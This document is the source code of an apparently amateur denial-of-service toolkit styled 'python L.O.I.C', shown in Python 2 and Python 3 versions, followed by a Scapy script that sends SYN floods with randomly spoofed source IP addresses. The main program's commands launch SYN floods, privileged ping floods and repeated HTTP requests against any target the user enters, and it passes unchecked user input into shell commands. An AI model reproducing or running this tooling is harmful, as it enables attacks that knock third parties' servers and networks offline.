import time
import os
import urllib
import socket
import getpass
liste=['whoami', 'whois', 'ping', 'help', 'http','del history','history','flood','ip','syn','config','installscapy']
fin = False
os1=['fedora','debian','mac os','ubuntu','ios']
os3=['windows']
allos=os1+os3
fdmu=str()
user=getpass.getuser()
adieu = ['bye', 'salut', 'a+', 'ciao', 'exit','quit','killme','kill','stfu','see you','au revoir',]
help = '________________________________________________________\n|SYN to send TCP packets with syn header (syn flood)---|\n|PING just to ping a server----------------------------|\n|FLOOD to flood with pings (need administrador account)|\n|HISTORY to show history-------------------------------|\n|DEL HISTORY to delete the history---------------------|\n|CTRL+C or EXIT to quit--------------------------------|\n|WHOIS to whois----------------------------------------|\n|WHOAMI if you are amnesic-----------------------------|\n|IP to see your current ip adress----------------------|\n|CONFIG to define your OS------------------------------|\n|______________________________________________________|'
sep = "____________________________________________________"
minisep = "-----"
idiot=0
print (sep+'\npython L.O.I.C for python 2.xx. V 2.5.2\n')
print ('HELP for commands and help')
print ("I'm not responsible of your acts with this software.\n"+sep)
try:
	fichier = open('config.txt', 'r')
	fdmu=(fichier.read())
	fichier.close()
	conferror=False
except IOError:
	print ('Config not found')
	conferror=True
if fdmu=="ios":
	print("IOS to see the ios-related help")
	liste.append("ios")
while fin == False:
	command=raw_input('Hunt:\ ').lower()
	if command == 'syn':
		print(minisep)
		if user!='root':
			if fdmu in os1:
				target=socket.gethostbyname(raw_input("Target : "))
				if fdmu=='ios':
					print("Synsender doesn't work correctly with ios") 				
				os.system("su -c 'python synsenderv1.1.1.py "+target+"'")
			if fdmu in os3:
				print("Windows os not tested")
				target=socket.gethostbyname(raw_input("Target : "))
				os.system('runas /noprofile /user:Administrator python synsenderv1.1.1.py '+target)
		if fdmu not in allos:
			print("This OS is not supported, run config to change OS")
		if user=='root':
			target=socket.gethostbyname(raw_input("Target : "))
			os.system("python synsenderv1.1.1.py "+target)
		fichier = open('history.txt', 'a')
		fichier.write("synsender "+target+'\n')
		fichier.close()
		print(sep)
	if command == 'del history':
		print(sep)
		fichier = open('history.txt', 'w')
		fichier.write('')
		fichier.close()
		print("History deleted")
		print(sep)
	if command == 'history':
		print(sep)
		print ('History: \n')
		try:
			fichier = open('history.txt', 'r')
			print(fichier.read())
			fichier.close()
		except IOError:
			print ('Not found !')
		print(sep)
	if command == 'ping':
		print(sep)
		pingsites = raw_input('to~> ')
		hm = raw_input("How many pings ? ")
		wi = raw_input("What interval ? in sec ")
		print(minisep)
		os.system('ping -c '+hm+' -i '+wi+' '+pingsites)
		fichier = open('history.txt', 'a')
		fichier.write("ping "+pingsites+'\n')
		fichier.close()
		print(sep)
	if command == 'config':
		fdmut=raw_input("What's your OS ? windows/mac os/debian/ubuntu/fedora/ios\n")
		if fdmut not in allos:
			print("Please choose an OS from the list")
		else:
			fichier = open('config.txt', 'w')
			fichier.write(fdmut)
			fichier.close()
			print("OK")
	if command == 'flood':
		print(sep)
		if conferror==False:
			if fdmu in os1:
				pingsites = raw_input('ping to~> ')
				hm = raw_input("How many pings ? ")
				flood = str('ping -c '+hm+' -f '+pingsites)
				print(minisep)
				if user!='root':
					os.system('su -c '+"'"+flood+"'")
				if user=='root':
					os.system(flood)
			if fdmu in os3:
				pingsites = raw_input('ping to~> ')
				hm = raw_input("How many pings ? ")
				os.system("ping -n "+hm+" "+pingsites)
			fichier = open('history.txt', 'a')
			fichier.write("pingflood "+pingsites+'\n')
			fichier.close()
		if conferror==True:
			print("Configuration error")
		print(sep)
	if command == 'http':
		print(sep)
		e = 0
		httpsite = raw_input("to~> ")
		hwt = raw_input("How many times ? ")
		fichier = open('history.txt', 'a')
		fichier.write("httpddos "+httpsite+"\n")
		fichier.close()
		while e<=hwt:
			page = urllib.urlopen(httpsite)
			page.read()
			e += 1
			print (e)
		print(sep)
	if command == 'whois':
		print(sep)
		whoisname = raw_input("Who ? ")
		print(minisep)
		os.system("whois "+whoisname)
		fichier = open('history.txt', 'a')
		fichier.write("whois "+whoisname+"\n")
		fichier.close()
		print(sep)
	if command == 'whoami':
		print(sep)
		print(user)
		print(sep)
	if command == 'help':
		print (help)
	if command == 'ip':
		print(sep)
		try:
			print ('local ip: '+socket.gethostbyname(socket.gethostname())+'\nFinding external ip, will take a while')
		except:
			print("Error")
		try:
			print("external ip: "+urllib.urlopen("http://automation.whatismyip.com/n09230945.asp").read())
		except:
			print("Error")
		print(sep)
	if command == 'ios':
		dw=raw_input("Synsender doesn't work correctly with ios yet\nIf whois doesn't work, type now whois\n").lower()
		if dw == 'whois':
			os.system("apt-get install whois")
			print("Whois is now installed")
	if command == 'installscapy':
		if fdmu=='ios':
			os.system("apt-get install wget unzip")
		if fdmu in os1:
			os.system("wget http://www.secdev.org/projects/scapy/files/scapy-latest.zip")
			os.system("unzip scapy-latest.zip")
			os.system("rm -f -r scapy-latest.zip")
			os.system("cd scapy*/ && sudo python setup.py install")
			print('OK, you can remove the "scapy-x.x.x" directory')
		if fdmu in os3:
			print("Sorry you have to install manualy scapy on windows")
	if command in adieu:
		fin=True
	elif command not in liste:
		print ('> ?!')
		idiot+=1
		if idiot > 4:
			idiot=0
			print("Here is the help :\n"+help)
print ("Good bye")
quit()


# -*- coding: cp1252 -*-
import time
import os
import urllib.request
import socket
import getpass
liste=['whoami', 'whois', 'ping', 'help', 'http','del history','history','flood','ip','syn','config','installscapy']
fin = False
os1=['fedora','debian','mac os','ubuntu','ios']
os3=['windows']
allos=os1+os3
fdmu=str()
user=getpass.getuser()
adieu = ['bye', 'salut', 'a+', 'ciao', 'exit','quit','killme','kill','stfu','see you','au revoir',]
help = '________________________________________________________\n|SYN to send TCP packets with syn header (syn flood)---|\n|PING just to ping a server----------------------------|\n|FLOOD to flood with pings (need administrador account)|\n|HISTORY to show history-------------------------------|\n|DEL HISTORY to delete the history---------------------|\n|CTRL+C or EXIT to quit--------------------------------|\n|WHOIS to whois----------------------------------------|\n|WHOAMI if you are amnesic-----------------------------|\n|IP to see your current ip adress----------------------|\n|CONFIG to define your OS------------------------------|\n|______________________________________________________|'
sep = "____________________________________________________"
minisep = "-----"
idiot=0
print (sep+'\npython L.O.I.C for python 3.xx. V 2.5.2\n')
print ('HELP for commands and help')
print ("I'm not responsible of your acts with this software.\n"+sep)
try:
	fichier = open('config.txt', 'r')
	fdmu=(fichier.read())
	fichier.close()
	conferror=False
except IOError:
	print ('Config not found')
	conferror=True
if fdmu=="ios":
	print("IOS to see the ios-related help")
	liste.append("ios")
while fin == False:
	command=str(input('Hunt:\ ')).lower()
	if command == 'syn':
		print(minisep)
		if user!='root':
			if fdmu in os1:
				target=socket.gethostbyname(str(input("Target : ")))
				if fdmu=='ios':
					print("Synsender doesn't work correctly with ios")
				os.system("su -c 'python synsenderv1.1.1.py "+target+"'")
			if fdmu in os3:
				print("Windows os not tested")
				target=socket.gethostbyname(str(input("Target : ")))
				os.system('runas /noprofile /user:Administrator python synsenderv1.1.1.py '+target)
		if fdmu not in allos:
			print("This OS is not supported, run config to change OS")
		if user=='root':
			target=socket.gethostbyname(str(input("Target : ")))
			os.system("python synsenderv1.1.1.py "+target)
		fichier = open('history.txt', 'a')
		fichier.write("synsender "+target+'\n')
		fichier.close()
		print(sep)
	if command == 'del history':
		print(sep)
		fichier = open('history.txt', 'w')
		fichier.write('')
		fichier.close()
		print("History deleted")
		print(sep)
	if command == 'history':
		print(sep)
		print ('History: \n')
		try:
			fichier = open('history.txt', 'r')
			print(fichier.read())
			fichier.close()
		except IOError:
			print ('Not found !')
		print(sep)
	if command == 'ping':
		print(sep)
		pingsites = input('to~> ')
		hm = str(input("How many pings ? "))
		wi = str(input("What interval ? in sec "))
		print(minisep)
		os.system('ping -c '+hm+' -i '+wi+' '+pingsites)
		fichier = open('history.txt', 'a')
		fichier.write("ping "+pingsites+'\n')
		fichier.close()
		print(sep)
	if command == 'config':
		fdmut=str(input("What's your OS ? windows/mac os/debian/ubuntu/fedora/ios\n"))
		if fdmut not in allos:
			print("Please choose an OS from the list")
		else:
			fichier = open('config.txt', 'w')
			fichier.write(fdmut)
			fichier.close()
			print("OK")
	if command == 'flood':
		print(sep)
		if conferror==False:
			if fdmu in os1:
				pingsites = str(input('ping to~> '))
				hm = str(input("How many pings ? "))
				flood = str('ping -c '+hm+' -f '+pingsites)
				print(minisep)
				if user!='root':
					os.system('su -c '+"'"+flood+"'")
				if user=='root':
					os.system(flood)
			if fdmu in os3:
				pingsites = str(input('ping to~> '))
				hm = str(input("How many pings ? "))
				os.system("ping -n "+hm+" "+pingsites)
			fichier = open('history.txt', 'a')
			fichier.write("pingflood "+pingsites+'\n')
			fichier.close()
		if conferror==True:
			print("Configuration error")
		print(sep)
	if command == 'http':
		print(sep)
		e = 0
		httpsite = input("to~> ")
		hwt = int(input("How many times ? "))
		fichier = open('history.txt', 'a')
		fichier.write("httpddos "+httpsite+"\n")
		fichier.close()
		while e<=hwt:
			with urllib.request.urlopen('http://'+httpsite+'/') as page:
				page.read()
			e += 1
			print (e)
		print(sep)
	if command == 'whois':
		print(sep)
		whoisname = input("Who ? ")
		print(minisep)
		os.system("whois "+whoisname)
		fichier = open('history.txt', 'a')
		fichier.write("whois "+whoisname+"\n")
		fichier.close()
		print(sep)
	if command == 'whoami':
		print(sep)
		print(user)
		print(sep)
	if command == 'help':
		print (help)
	if command == 'ip':
		print(sep)
		try:
			print ('local ip: '+socket.gethostbyname(socket.gethostname())+'\nFinding external ip, will take a while')
		except:
			print("Error")
		try:
			print('external ip: '+str(urllib.request.urlopen("http://automation.whatismyip.com/n09230945.asp").read(), "utf8"))
		except:
			print('Error')
		print(sep)
	if command == 'ios':
		dw=str(input("Synsender doesn't work correctly with ios yet\nIf whois doesn't work, type now whois\n").lower())
		if dw == 'whois':
			os.system("apt-get install whois")
			print("Whois is now installed")
	if command == 'installscapy':
		if fdmu=='ios':
			os.system("apt-get install wget unzip")
		if fdmu in os1:
			os.system("wget http://www.secdev.org/projects/scapy/files/scapy-latest.zip")
			os.system("unzip scapy-latest.zip")
			os.system("rm -f -r scapy-latest.zip")
			os.system("cd scapy*/ && sudo python setup.py install")
			print('OK, you can remove the "scapy-x.x.x" directory')
		if fdmu in os3:
			print("Sorry you have to install manualy scapy on windows")
	if command in adieu:
		fin=True
	elif command not in liste:
		print ('> ?!')
		idiot+=1
		if idiot > 4:
			idiot=0
			print("Here is the help :\n"+help)
print ("Good bye")
quit()

# -*- coding: cp1252 -*-
import socket
try:
	from scapy.all import *
except:
	print("Scapy importation error, try running 'installscapy' (only on linux and macos/ios)")
import random
import sys
import time
print '\npythonLoic SYN packets sender V1.1.1\nWhith ip spoofing'
print "I'm not responsible of your acts with this software.\n"
conf.iface='wlan0'
target = sys.argv[1]
num=int(raw_input("How many packets ? "))
port=int(raw_input("Port : "))
ip = IP()
ip.dst = target
c=0
tcp = TCP()
start = time.time()
start1 = time.time()
tcp.dport = port
tcp.flags = 'S'
while c<num:
	ip.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
	tcp.sport = RandShort()
	packet=ip/tcp
	send(packet, verbose=0)
	c += 1
	if c%100==0:
		elapsed= time.time() - start
		ps=int(100/elapsed)
		print(str(c)+"    Packets/sec : "+str(ps))
		start = time.time()
elapsed= time.time() - start1
print("Average packets/sec : "+str(num/elapsed))
print ("Successful !")
